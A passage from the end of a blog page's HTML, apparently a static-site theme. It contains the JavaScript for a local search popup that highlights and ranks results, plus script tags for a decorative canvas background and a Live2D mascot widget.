                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  
  

  

  

  

  

  

  
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
</html>
